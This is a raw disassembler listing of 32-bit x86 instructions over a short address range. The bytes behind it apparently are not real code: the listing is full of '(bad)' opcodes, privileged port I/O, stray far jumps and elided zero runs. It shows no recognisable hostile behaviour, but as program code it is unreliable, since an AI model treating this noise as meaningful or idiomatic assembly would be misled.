  420c2c:	lock (bad) 
  420c2e:	popa   
  420c2f:	vhaddps xmm1,xmm6,XMMWORD PTR [eax]
  420c33:	sahf   
  420c34:	ins    DWORD PTR es:[edi],dx
  420c35:	jbe    0x420c45
  420c37:	fcmovu st,st(1)
  420c39:	repz rcr bl,1
  420c3c:	cmp    DWORD PTR ds:0x22a4f2d6,esi
  420c42:	dec    ecx
  420c43:	add    bl,BYTE PTR [eax]
  420c45:	test   al,0x97
  420c47:	retf   0xfd8f
  420c4a:	lods   al,BYTE PTR ds:[esi]
  420c4b:	lods   eax,DWORD PTR ds:[esi]
  420c4c:	arpl   WORD PTR [esi+0x294ff2d8],sp
  420c52:	pop    eax
  420c53:	cwde   
  420c54:	push   edi
  420c55:	repz out 0x57,eax
  420c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c59:	xchg   dh,ch
  420c5b:	(bad)  
  420c5d:	cwde   
  420c5e:	sbb    DWORD PTR [esi],ebx
  420c60:	cmp    dh,ch
  420c62:	cmp    esi,edi
  420c64:	inc    ebp
  420c65:	rcl    DWORD PTR [edx-0x6c],1
  420c68:	cmp    DWORD PTR [ebp+0x1a4e029d],esp
	...
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0x70
  420ce3:	sub    eax,0x6067a1b6
  420ce8:	add    DWORD PTR [eax],eax
  420cea:	add    BYTE PTR [ecx],al
  420cec:	add    BYTE PTR [eax],al
  420cee:	mov    eax,0xa4f5157e
  420cf3:	loope  0x420c8c
  420cf5:	push   cs
  420cf6:	int    0xcf
  420cf8:	fdivrp st(1),st
  420cfa:	jb     0x420cfd
  420cfc:	mov    WORD PTR ds:0x4a6a8169,?
  420d02:	push   edx
  420d03:	addr16 push cs
  420d05:	sti    
  420d06:	pfacc  mm7,QWORD PTR [ecx-0x5f]
  420d0b:	scas   al,BYTE PTR es:[edi]
  420d0c:	sub    cl,dh
  420d0e:	(bad)  
  420d0f:	mov    ebp,DWORD PTR [esi+edi*4+0x231f7961]
  420d16:	and    al,0x86
  420d18:	add    ebp,DWORD PTR [ecx-0x4f]
  420d1b:	out    0x96,al
  420d1d:	or     ecx,eax
  420d1f:	lods   al,BYTE PTR ds:[esi]
  420d20:	(bad)  
  420d21:	retf   0x5c59
  420d24:	inc    esp
  420d25:	leave  
  420d26:	jae    0x420d31
  420d28:	bound  esi,QWORD PTR [esi+0x53864b26]
  420d2e:	cmp    bl,0x33
  420d31:	mov    dl,0x5d
  420d33:	outs   dx,BYTE PTR ds:[esi]
  420d34:	mov    dl,0x88
  420d36:	mov    cl,dl
  420d38:	in     eax,0xac
  420d3a:	in     al,0xb8
  420d3c:	mov    ebx,0x50538321
  420d41:	test   BYTE PTR ss:[eax-0x65],dl
  420d45:	jmp    0xb5bc:0xb163
  420d4b:	std    
  420d4c:	sbb    cl,BYTE PTR [ebp+0xeaa174c]
  420d52:	bound  esi,QWORD PTR [ebx+0x7c641268]
  420d58:	xchg   edi,eax
  420d59:	jmp    0x420d95
  420d5b:	and    DWORD PTR [eax+0x7f0b3606],0xbaf81066
  420d65:	jp     0x420d39
  420d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d68:	scas   al,BYTE PTR es:[edi]
  420d69:	lea    ebx,[ebp+0x408a7c31]
  420d6f:	add    bl,bl
  420d71:	sti    
  420d72:	push   eax
  420d73:	jne    0x420d39
  420d75:	test   DWORD PTR [eax+0x66ad3c8b],esp
  420d7b:	lds    edx,FWORD PTR [ebx-0x18]
  420d7e:	jb     0x420d7c
  420d80:	retf   
  420d81:	xchg   DWORD PTR [esi-0x2c],eax
  420d84:	sub    bl,cl
  420d86:	push   ebp
  420d87:	test   DWORD PTR [eax-0x1664d3d7],esp
  420d8d:	push   esp
  420d8e:	cmp    ch,BYTE PTR [esi]
  420d90:	sbb    ebp,DWORD PTR [edi+edi*8]
  420d93:	scas   eax,DWORD PTR es:[edi]
  420d94:	mov    BYTE PTR [esi+0x24a77753],dh
  420d9a:	sub    ah,BYTE PTR [ebx-0x34]
  420d9d:	mov    DWORD PTR [edi],edx
  420d9f:	or     ebx,edi
  420da1:	dec    ecx
  420da2:	clc    
  420da3:	and    bl,BYTE PTR [ecx+0x68447c47]
  420da9:	call   0xc997:0x30fd8be3
  420db0:	out    0x3e,eax
  420db2:	mov    edx,0x59dff93c
  420db7:	fidiv  WORD PTR [edx]
  420db9:	xor    eax,0x6c290341
  420dbe:	test   edx,0x525c4e36
  420dc4:	xchg   BYTE PTR [edx],dh
  420dc6:	mov    esp,0xf3b2a5a5
  420dcb:	out    0x63,al
  420dcd:	jo     0x420e1c
  420dcf:	cmc    
  420dd0:	iret   
  420dd1:	sub    al,0xe9
  420dd3:	out    dx,eax
  420dd4:	or     ah,BYTE PTR [ebx]
  420dd6:	pop    ebp
  420dd7:	das    
  420dd8:	jl     0x420ddd
  420dda:	push   ds
  420ddb:	repnz pop ss
  420ddd:	ins    BYTE PTR es:[edi],dx
  420dde:	pop    eax
  420ddf:	arpl   WORD PTR [eax+0x39],cx
  420de2:	fdivr  DWORD PTR [edx+0x164c3a52]
  420de8:	rcl    esp,1
  420dea:	add    al,0x5b
  420dec:	into   
  420ded:	add    BYTE PTR gs:[eax],al
	...
  420e54:	add    BYTE PTR [eax],al
  420e56:	out    0x1e,eax
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0xb598eb7c
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	pop    eax
  420e6f:	xchg   BYTE PTR [edi-0x17],ch
  420e72:	and    al,0x15
  420e74:	call   0x5ac896ff
  420e79:	xor    al,0xed
  420e7b:	addr16 jo 0x420e37
  420e7e:	or     esp,DWORD PTR [edi+0x51]
  420e81:	adc    al,0x7f
  420e83:	ins    DWORD PTR es:[edi],dx
  420e84:	and    BYTE PTR [eax],dh
  420e86:	sbb    BYTE PTR [edi+0x21af797d],ch
  420e8c:	(bad)  
  420e8d:	jns    0x420e38
  420e8f:	and    bl,BYTE PTR [eax-0x40]
  420e92:	arpl   bp,bx
  420e94:	repz inc ecx
  420e96:	pop    ss
  420e97:	mov    ecx,0xb75266e8
  420e9c:	jb     0x420eed
  420e9e:	mov    bl,0xb0
  420ea0:	jp     0x420e93
  420ea2:	dec    ecx
  420ea3:	out    dx,eax
  420ea4:	(bad)  
  420ea5:	cdq    
  420ea6:	pop    ds
  420ea7:	adc    ah,cl
  420ea9:	out    dx,eax
  420eaa:	xor    al,0xea
  420eac:	pop    edx
  420ead:	jmp    0x420eba
  420eaf:	lock cwde 
  420eb1:	add    DWORD PTR [esi-0x525f0588],ebx
  420eb7:	jmp    0xd9d6:0x164caa14
  420ebe:	int    0x29
  420ec0:	pop    ebx
  420ec1:	jg     0x420e73
  420ec3:	mul    DWORD PTR [esi-0x15cc3f1a]
  420ec9:	inc    ebp
  420eca:	pop    edi
  420ecb:	adc    al,0x14
  420ecd:	cs pop esi
  420ecf:	mov    bh,BYTE PTR [esi+0x89e674b]
  420ed5:	jo     0x420f4a
  420ed7:	xchg   BYTE PTR [esi+0x2fd8851c],bl
  420edd:	jl     0x420efc
  420edf:	xor    al,0x44
  420ee1:	dec    edi
  420ee2:	pop    ecx
  420ee3:	cdq    
  420ee4:	out    dx,eax
  420ee5:	in     al,0x9a
  420ee7:	(bad)  
  420ee8:	fdiv   DWORD PTR [ebx+0x25]
  420eeb:	dec    esi
  420eec:	cs scas al,BYTE PTR es:[edi]
  420eee:	adc    eax,0x5656deda
  420ef3:	mov    WORD PTR [eax+0x79bcb19e],cs
  420ef9:	sub    ebp,eax
  420efb:	sbb    eax,DWORD PTR [ebx+0x7067c4e3]
  420f01:	ret    0xdcce
  420f04:	ins    DWORD PTR es:[edi],dx
  420f05:	xchg   edx,eax
  420f06:	push   esp
  420f07:	xlat   BYTE PTR ds:[ebx]
  420f08:	int3   
  420f09:	aad    0x15
  420f0b:	jge    0x420f7b
  420f0d:	std    
  420f0e:	and    DWORD PTR [esi+ebp*1-0x33370915],ebp
  420f15:	pop    edi
  420f16:	mov    eax,0x5834477c
  420f1b:	loop   0x420ea1
  420f1d:	in     al,0xa8
  420f1f:	(bad)  
  420f20:	xchg   edi,eax
  420f21:	dec    ecx
  420f22:	call   0xb6dbbc14
  420f27:	test   al,0xe5
  420f29:	mov    ds:0xfb11a4c8,eax
  420f2e:	xchg   ebx,eax
  420f2f:	adc    eax,0x6483d87c
  420f34:	xor    dl,BYTE PTR [ebx-0x2c]
  420f37:	dec    esp
  420f38:	pop    edi
  420f39:	cmp    al,BYTE PTR [ecx-0x4db58bc1]
  420f3f:	daa    
  420f40:	je     0x420f9e
  420f42:	cmp    BYTE PTR [ecx-0x3b],dl
  420f45:	stos   DWORD PTR es:[edi],eax
  420f46:	ret    0xd7d4
  420f49:	xchg   DWORD PTR [ecx+eax*4-0x65403f30],ebx
  420f50:	mul    DWORD PTR [ebx+0x19f3b299]
  420f56:	dec    ebx
  420f57:	mov    cs,WORD PTR [eax]
  420f59:	push   0x49
  420f5b:	adc    esi,edi
  420f5d:	fsub   st,st(7)
  420f5f:	outs   dx,DWORD PTR ds:[esi]
  420f60:	mov    al,ah
  420f62:	jne    0x420f6e
  420f64:	mov    ebp,0x16fa0a8c
  420f69:	mov    ecx,cr2
  420f6c:	sub    ebp,DWORD PTR [eax+eax*1+0x0]
	...
  420fd3:	add    BYTE PTR [eax],al
  420fd5:	add    BYTE PTR [eax],ah
  420fd7:	xchg   edi,eax
  420fd8:	inc    edx
  420fd9:	shl    edi,cl
  420fdb:	xlat   BYTE PTR ds:[ebx]
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x993830c]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    dl,ch
  420fef:	cdq    
  420ff0:	sub    eax,0xc48a0c9f
  420ff5:	mov    esi,0x6015c538
  420ffa:	adc    eax,0x66923b7e
  420fff:	ror    DWORD PTR [edx-0x32],0x84
  421003:	mov    ah,0x92
  421005:	enter  0xcf07,0x29
  421009:	inc    esi
  42100a:	push   0x7f
  42100c:	add    al,0x95
  42100e:	scas   eax,DWORD PTR es:[edi]
  42100f:	xchg   ebx,eax
  421010:	mov    eax,ds:0x25a00d6d
  421015:	loop   0x421080
  421017:	mov    ebx,0x29ac9edc
  42101c:	pushf  
  42101d:	pop    eax
  42101e:	in     eax,0x25
  421020:	xor    ebx,ecx
  421022:	outs   dx,DWORD PTR ds:[esi]
  421023:	jns    0x421090
  421025:	stc    
  421026:	mov    eax,ds:0x12c2b3d7
  42102b:	retf   0xedb7
  42102e:	jp     0x42109a
  421030:	mov    eax,ds:0xc8448bfb
  421035:	leave  
  421036:	jp     0x420fdf
  421038:	nop
  421039:	inc    esi
  42103a:	pop    ecx
  42103b:	sub    eax,DWORD PTR [ebx+0x34dd448b]
  421041:	test   al,0x75
  421043:	sti    
  421044:	mov    ebp,0x4380f527
  421049:	and    eax,0x347a18b1
  42104e:	stos   BYTE PTR es:[edi],al
  42104f:	in     al,0xcf
  421051:	and    ecx,DWORD PTR [edx-0x80]
  421054:	jo     0x420fed
  421056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421057:	inc    edi
  421058:	addr16 cld 
  42105a:	test   DWORD PTR [edi+eax*2],0xacff49a6
  421061:	and    bl,cl
  421063:	fmul   st,st(3)
  421065:	fidivr WORD PTR [eax+0x6a006888]
  42106b:	ins    DWORD PTR es:[edi],dx
  42106c:	and    BYTE PTR [edi-0x7b],ch
  42106f:	popa   
  421070:	out    dx,eax
  421071:	sbb    eax,0x69121327
  421076:	or     BYTE PTR [ebx],al
  421078:	and    dh,BYTE PTR [edx-0x20]
  42107b:	lea    ecx,ds:[ebx]
  42107e:	cli    
  42107f:	fnstenv [ecx+eax*1-0x4f64a614]
  421086:	aas    
  421087:	xchg   esi,eax
  421088:	loop   0x4210b2
  42108a:	fbstp  TBYTE PTR [ebx]
  42108c:	daa    
  42108d:	outs   dx,BYTE PTR ds:[esi]
  42108e:	out    dx,eax
  42108f:	std    
  421090:	fwait
  421091:	idiv   BYTE PTR [esp+ebx*2+0x7d]
  421095:	loop   0x4210e6
  421097:	stos   BYTE PTR es:[edi],al
  421098:	pushf  
  421099:	cdq    
  42109a:	lds    ecx,FWORD PTR es:0x855b9d51
  4210a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210a2:	ja     0x421119
  4210a4:	mov    ah,BYTE PTR ds:0xada48c4d
  4210aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210ab:	inc    ebx
  4210ac:	dec    ebx
  4210ad:	pop    esp
  4210ae:	pop    ebx
  4210af:	ins    DWORD PTR es:[edi],dx
  4210b0:	ss in  eax,dx
  4210b2:	add    al,0xdd
  4210b4:	repnz pushf 
  4210b6:	ins    BYTE PTR es:[edi],dx
  4210b7:	fld    DWORD PTR [edi]
  4210b9:	cli    
  4210ba:	adc    BYTE PTR [ebx+edx*4],al
  4210bd:	inc    eax
  4210be:	leave  
  4210bf:	inc    esi
  4210c0:	(bad)  
  4210c1:	jns    0x421129
  4210c3:	sbb    al,0xaa
  4210c5:	push   esi
  4210c6:	std    
  4210c7:	xchg   edx,eax
  4210c8:	push   edx
  4210c9:	pop    es
  4210ca:	lahf   
  4210cb:	das    
  4210cc:	hlt    
  4210cd:	inc    edx
  4210ce:	adc    bh,dl
  4210d0:	mov    cl,0xec
  4210d2:	inc    edx
  4210d3:	pop    es
  4210d4:	sub    bl,BYTE PTR [edi+ecx*8-0x8]
  4210d8:	ins    DWORD PTR es:[edi],dx
  4210d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210da:	cmp    eax,0x4b77aab4
  4210df:	mov    ch,0xa6
  4210e1:	repz out 0xdb,al
  4210e4:	daa    
  4210e5:	bound  ecx,QWORD PTR [ebp+0x7f]
  4210e8:	retf   
  4210e9:	bound  edx,QWORD PTR [ebp+0xaf73bf]
	...
  421153:	add    BYTE PTR [eax],al
  421155:	add    BYTE PTR [edi-0x243925a2],bl
  42115b:	(bad)  
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    cs,WORD PTR [ebx+0x28]
  421164:	mov    bh,BYTE PTR [ebx+0x67]
  421167:	arpl   WORD PTR [ecx],ax
  421169:	add    BYTE PTR [eax],al
  42116b:	add    DWORD PTR [eax],eax
  42116d:	add    BYTE PTR [esi+0x78d3492d],bl
  421173:	sbb    BYTE PTR [ebp+0x50],ch
  421176:	cmp    al,0x9a
  421178:	dec    eax
  421179:	adc    edx,ebx
  42117b:	daa    
  42117c:	les    esi,FWORD PTR [ecx]
  42117e:	xchg   esi,eax
  42117f:	push   esi
  421180:	mov    esi,0x9285731c
  421185:	icebp  
  421186:	aad    0x4b
  421188:	push   0xffffffc5
  42118a:	dec    esi
  42118b:	pop    edi
  42118c:	xchg   BYTE PTR [eax-0x31],bh
  42118f:	push   cs
  421190:	jg     0x421180
  421192:	xchg   esp,eax
  421193:	sti    
  421194:	mov    dh,0x5d
  421196:	repz inc edx
  421198:	mov    ah,0xd2
  42119a:	add    esi,DWORD PTR [eax]
  42119c:	xor    BYTE PTR ds:0x8afd7fb1,ch
  4211a2:	xor    bl,BYTE PTR [edx]
  4211a4:	jbe    0x42116d
  4211a6:	adc    esp,DWORD PTR [edi-0x15]
  4211a9:	test   BYTE PTR [ebx-0x48],dl
  4211ac:	mov    edi,0xd6d559bd
  4211b1:	mov    ah,0x1e
  4211b3:	lea    ebx,[esi]
  4211b5:	mov    ecx,eax
  4211b7:	inc    ecx
  4211b8:	sub    eax,0xfe670266
  4211bd:	xchg   edx,eax
  4211be:	imul   edi,DWORD PTR [eax-0x62],0xffffff8a
  4211c2:	test   al,0xe
  4211c4:	jno    0x4211eb
  4211c6:	sar    BYTE PTR [edi+0x33],0x7d
  4211ca:	xchg   ebp,eax
  4211cb:	(bad)  
  4211cd:	xor    ecx,DWORD PTR fs:[ebx+0x33]
  4211d1:	and    al,0xe4
  4211d3:	mov    bh,0x39
  4211d5:	adc    eax,0x80882b6b
  4211da:	jp     0x4211a0
  4211dc:	daa    
  4211dd:	enter  0x5560,0xf
  4211e1:	into   
  4211e2:	sub    eax,0x6fc8dbf8
  4211e7:	dec    eax
  4211e8:	sar    BYTE PTR cs:[ecx],0x3f
  4211ec:	fstp   DWORD PTR [eax+0x24d3aaef]
  4211f2:	xor    BYTE PTR [ecx-0x4f],bh
  4211f5:	push   0xdfdd1ebb
  4211fa:	daa    
  4211fb:	popa   
  4211fc:	push   esi
  4211fd:	mov    WORD PTR [esi-0x47],es
  421200:	cmc    
  421201:	repz cmp ah,cl
  421204:	aaa    
  421205:	retf   
  421206:	dec    eax
  421207:	inc    ebp
  421208:	or     BYTE PTR [edx-0x772fccc],ch
  42120e:	xor    bl,BYTE PTR [ecx-0x40f7106a]
  421214:	mov    ah,0x3c
  421216:	and    eax,edx
  421218:	jae    0x4211fe
  42121a:	rcr    DWORD PTR [edi-0x33425dd3],1
  421220:	shl    BYTE PTR [ebp-0x68],0x3
  421224:	sar    DWORD PTR [ebp-0x43],1
  421227:	xchg   edi,eax
  421228:	lods   al,BYTE PTR ds:[esi]
  421229:	(bad)  
  42122a:	mov    bl,0x45
  42122c:	sub    al,0xe8
  42122e:	jno    0x421282
  421230:	mov    ebp,0xdce08865
  421235:	mov    ds:0xaaaef1a8,al
  42123a:	icebp  
  42123b:	push   0x2d070937
  421240:	pusha  
  421241:	cld    
  421242:	and    cl,bl
  421244:	in     al,0x3
  421246:	in     eax,0xd5
  421248:	sbb    DWORD PTR ds:0x250b6ac8,ebx
  42124e:	inc    esi
  42124f:	push   ebp
  421250:	pop    ecx
  421251:	daa    
  421252:	enter  0x7760,0x8d
  421256:	out    dx,eax
  421257:	test   al,0x24
  421259:	or     dl,BYTE PTR [ebx+0x42f2919d]
  42125f:	in     eax,0x62
  421261:	cmp    cl,BYTE PTR [edx+0x18caf844]
  421267:	test   BYTE PTR [ebp-0x16],dl
  42126a:	pusha  
  42126b:	loopne 0x421281
  42126d:	test   DWORD PTR [eax],eax
	...
  4212d3:	add    BYTE PTR [eax],al
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0xdfeb7ab3
  4212e4:	scas   al,BYTE PTR es:[edi]
  4212e5:	enter  0x6467,0x1
  4212e9:	add    BYTE PTR [eax],al
  4212eb:	add    DWORD PTR [eax],eax
  4212ed:	add    BYTE PTR [ecx-0x9],bl
  4212f0:	cvtps2pd xmm4,QWORD PTR [edx+0x37b66d21]
  4212f7:	push   esi
  4212f8:	lds    esi,FWORD PTR [edx-0x7b32c086]
  4212fe:	add    eax,0xd78a5479
  421303:	pop    edx
  421304:	inc    esp
  421305:	ins    DWORD PTR es:[edi],dx
  421306:	in     eax,0xd3
  421308:	test   DWORD PTR es:[eax-0x9bbd347],eax
  42130f:	imul   esi,DWORD PTR [ecx],0x63
  421312:	push   0x5a
  421314:	lea    edi,[edi+0x255efdb5]
  42131a:	jecxz  0x421351
  42131c:	imul   esp,ebx,0xffffffbd
  42131f:	test   al,0xb5
  421321:	sti    
  421322:	push   esp
  421323:	jnp    0x4212da
  421325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421326:	cld    
  421327:	(bad)  
  421329:	inc    esi
  42132a:	dec    eax
  42132b:	fcomp  DWORD PTR [ebp+0x6abc08ad]
  421331:	(bad)  
  421332:	mov    dl,BYTE PTR [eax-0x34]
  421335:	inc    esp
  421336:	lgs    ebx,FWORD PTR [esi]
  421339:	addr16 stc 
  42133b:	dec    edx
  42133c:	sub    al,0xd5
  42133e:	fs jb  0x421384
  421341:	pop    es
  421342:	aas    
  421343:	scas   eax,DWORD PTR es:[edi]
  421344:	sub    bh,bl
  421346:	neg    DWORD PTR [eax]
  421348:	sub    ah,BYTE PTR [eax+0x200a0118]
  42134e:	outs   dx,DWORD PTR ds:[esi]
  42134f:	je     0x421315
  421351:	mov    ch,0x30
  421353:	fld    QWORD PTR [ecx]
  421355:	fmul   QWORD PTR [edi+0x3a]
  421358:	add    DWORD PTR ds:0xaeaec415,ecx
  42135e:	int3   
  42135f:	enter  0x47b5,0xc7
  421363:	retf   
  421364:	out    dx,al
  421365:	sbb    BYTE PTR [ebx-0x11d1e625],cl
  42136b:	xlat   BYTE PTR ds:[ebx]
  42136c:	loope  0x4213e9
  42136e:	mov    ebx,0xd0048b4b
  421373:	jbe    0x4213c8
  421375:	lea    edx,[ebp-0x73]
  421378:	ins    BYTE PTR es:[edi],dx
  421379:	dec    ebp
  42137a:	clc    
  42137b:	scas   eax,DWORD PTR es:[edi]
  42137c:	push   0x3c4d50b9
  421381:	push   esi
  421382:	mov    cl,0xe5
  421384:	xor    BYTE PTR [eax],0xca
  421387:	test   DWORD PTR [edi],esi
  421389:	popa   
  42138a:	into   
  42138b:	fst    DWORD PTR [ecx+0x64bad6d5]
  421391:	jne    0x4213e3
  421393:	mov    ds:0xcec8bbaf,al
  421398:	mov    dl,dh
  42139a:	addr16 leave 
  42139c:	nop
  42139d:	cmp    ah,bl
  42139f:	and    al,0x8e
  4213a1:	mov    dl,0x32
  4213a3:	inc    ebx
  4213a4:	mov    BYTE PTR [ebp+0x5d],al
  4213a7:	data16 mov ah,0xf5
  4213aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ab:	dec    ebx
  4213ac:	(bad)  
  4213ad:	adc    BYTE PTR [esi+edi*4+0x40],ah
  4213b1:	push   esp
  4213b3:	mov    DWORD PTR [esi+0x2d67e17f],eax
  4213b9:	stos   BYTE PTR es:[edi],al
  4213ba:	inc    esi
  4213bb:	xabort 0xd5
  4213be:	mov    ebx,0xce4d1716
  4213c3:	das    
  4213c4:	add    al,ah
  4213c6:	pop    ecx
  4213c7:	adc    ah,BYTE PTR [ecx]
  4213c9:	(bad)  
  4213cb:	sahf   
  4213cc:	(bad)  
  4213cd:	xor    dh,BYTE PTR ds:0x3b424fad
  4213d3:	sub    BYTE PTR [eax*4-0x4144f1f5],cl
  4213da:	aam    0xb8
  4213dc:	and    al,0xdb
  4213de:	xor    al,0xe0
  4213e0:	jns    0x4213b5
  4213e2:	push   ebx
  4213e3:	mov    ds:0x47f3462f,al
  4213e8:	fcomip st,st(5)
  4213ea:	and    al,0x88
  4213ec:	push   DWORD PTR [edx]
	...
  421456:	inc    bh
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp+0x3e5ff49f]
  421464:	test   al,bh
  421466:	add    DWORD PTR gs:[bx+si],eax
  42146a:	add    BYTE PTR [ecx],al
  42146c:	add    BYTE PTR [eax],al
  42146e:	push   0xffffffb0
  421470:	sub    bl,ah
  421472:	xor    esi,DWORD PTR [eax]
  421474:	add    dh,ch
  421476:	int3   
  421477:	lock xor DWORD PTR [ecx+0x48],esi
  42147b:	jns    0x421440
  42147d:	fistp  WORD PTR [edi]
  42147f:	out    dx,al
  421480:	inc    edx
  421481:	pop    ss
  421482:	(bad)  [edi]
  421484:	hlt    
  421485:	or     ecx,DWORD PTR [edx]
  421487:	ror    BYTE PTR [edi+0x741357c0],cl
  42148d:	sbb    al,0xeb
  42148f:	mov    bh,0x8c
  421491:	or     al,0x95
  421493:	inc    esi
  421494:	inc    edi
  421495:	dec    eax
  421496:	sbb    ah,BYTE PTR [edi+ebx*2]
  421499:	push   eax
  42149a:	dec    esi
  42149b:	mov    es,WORD PTR [ebp-0x4f205066]
  4214a1:	adc    ah,BYTE PTR [edi+edx*8-0x79cd3218]
  4214a8:	sub    BYTE PTR [edx-0x79432627],ch
  4214ae:	ds in  eax,0xcc
  4214b1:	jno    0x4214f6
  4214b3:	std    
  4214b4:	xor    al,0xa2
  4214b7:	dec    esi
  4214b8:	xchg   ebp,eax
  4214b9:	rol    BYTE PTR [ecx+0x19],0x22
  4214bd:	jne    0x4214ef
  4214bf:	or     eax,0xf5716b7c
  4214c4:	push   ecx
  4214c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214c6:	add    bl,BYTE PTR [edx+0x5a46d7be]
  4214cc:	(bad)  
  4214cd:	fs mov ah,0xc8
  4214d0:	push   cs
  4214d1:	gs sub al,0x2e
  4214d4:	push   ebp
  4214d5:	fcom   st(3)
  4214d7:	jbe    0x42153b
  4214d9:	pop    edi
  4214da:	ja     0x4214e4
  4214dc:	pop    eax
  4214dd:	movq   mm7,mm1
  4214e0:	and    dh,BYTE PTR [ebx+0x1e841e96]
  4214e6:	push   0x7d
  4214e8:	(bad)  
  4214e9:	in     al,dx
  4214ea:	stos   BYTE PTR es:[edi],al
  4214eb:	jecxz  0x421505
  4214ed:	loope  0x421486
  4214ef:	aad    0x33
  4214f1:	mov    bl,0xfe
  4214f3:	sub    dh,dl
  4214f5:	xor    BYTE PTR [edi-0x1d],0xbd
  4214f9:	push   edx
  4214fa:	aaa    
  4214fb:	cmp    al,0x34
  4214fd:	nop
  4214fe:	mov    DWORD PTR [ecx-0x7],edx
  421501:	sub    BYTE PTR [edi-0x6],bl
  421504:	mov    ds:0x9407aa84,eax
  421509:	mov    ds,WORD PTR [ebp+0x134e63d5]
  42150f:	add    DWORD PTR [ebx+0x70],esi
  421512:	pop    ebp
  421513:	(bad)  
  421514:	jnp    0x42149c
  421516:	add    cl,BYTE PTR [edx]
  421518:	jl     0x42153e
  42151a:	stos   DWORD PTR es:[edi],eax
  42151b:	int    0x27
  42151d:	jp     0x4214ec
  42151f:	add    BYTE PTR [ecx],dh
  421521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421522:	mov    cl,0x9
  421524:	icebp  
  421525:	and    al,0x8a
  421527:	(bad)  
  421528:	call   0xbb62ada3
  42152d:	xor    al,0x29
  42152f:	shl    ah,cl
  421531:	push   ss
  421532:	adc    edi,DWORD PTR [edx+0x6d]
  421535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421536:	ffree  st(6)
  421538:	mov    esp,0x112b28b5
  42153d:	sub    eax,0x922fa633
  421542:	pop    ss
  421543:	sub    eax,0xdc675737
  421548:	popa   
  421549:	add    BYTE PTR [ecx-0x46f813d3],cl
  42154f:	xchg   esp,eax
  421550:	scas   al,BYTE PTR es:[edi]
  421551:	(bad)  
  421552:	jmp    0x6d2f:0x981d470c
  421559:	mov    dh,0x65
  42155b:	icebp  
  42155c:	call   0xbfd1:0x1519bc5
  421563:	imul   esp,DWORD PTR [ebp-0x1f],0xb44da8ce
  42156a:	jbe    0x421550
  42156c:	xchg   edx,eax
  42156d:	dec    ebp
	...
  4215d6:	(bad)  
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x438342b4],bp
  4215e4:	sti    
  4215e5:	adc    al,0x67
  4215e7:	add    WORD PTR [eax],ax
  4215ea:	add    BYTE PTR [ecx],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	xor    BYTE PTR [ecx],dh
  4215f0:	shl    al,cl
  4215f2:	ret    0x461a
  4215f5:	xor    DWORD PTR [eax],esp
  4215f7:	dec    ebx
  4215f8:	or     dl,BYTE PTR [edx+0x5e21bb75]
  4215fe:	and    eax,0x76e4eb3b
  421603:	push   esp
  421604:	addr16 sub bh,0x62
  421608:	(bad)  
  421609:	jae    0x4215f3
  42160b:	fs mov esi,0x2555ea1f
  421611:	shr    BYTE PTR [eax+eiz*2],cl
  421614:	pusha  
  421615:	rol    DWORD PTR [eax],1
  421617:	fcom   QWORD PTR [eax+0x24]
  42161a:	dec    ebp
  42161b:	mov    eax,ds:0xc60bd58e
  421620:	cld    
  421621:	sbb    DWORD PTR [ebx],edx
  421623:	mov    WORD PTR [ecx+0x16],ss
  421626:	dec    ecx
  421627:	sbb    BYTE PTR [eax-0x79],al
  42162a:	push   ds
  42162b:	sub    eax,DWORD PTR [ecx+0x2]
  42162e:	jo     0x42167c
  421630:	por    mm0,mm4
  421633:	adc    al,0x4a
  421635:	test   al,0x83
  421637:	adc    bl,BYTE PTR [ebp-0x71c53c9e]
  42163d:	fldcw  WORD PTR [edx+0x2b]
  421640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421641:	cmp    esi,DWORD PTR cs:[edi-0xb416908]
  421648:	sbb    al,0x44
  42164a:	out    0x62,eax
  42164c:	lahf   
  42164d:	jno    0x4216ad
  42164f:	sbb    BYTE PTR [edi],cl
  421651:	cmp    DWORD PTR [esi],esp
  421653:	std    
  421654:	pusha  
  421655:	and    eax,DWORD PTR [esp+ebp*2]
  421658:	popf   
  421659:	rol    DWORD PTR [ecx+0x7e],1
  42165c:	pop    ebp
  42165d:	(bad)  
  42165f:	std    
  421660:	cli    
  421661:	push   0x378b2af0
  421666:	cli    
  421667:	aad    0xf3
  421669:	repnz inc esi
  42166b:	jl     0x421687
  42166d:	xchg   esi,eax
  42166e:	or     eax,0xb525a70c
  421673:	fild   WORD PTR [edi+eiz*8+0x12]
  421677:	loop   0x421687
  421679:	adc    ch,BYTE PTR [ecx]
  42167b:	lods   eax,DWORD PTR ds:[esi]
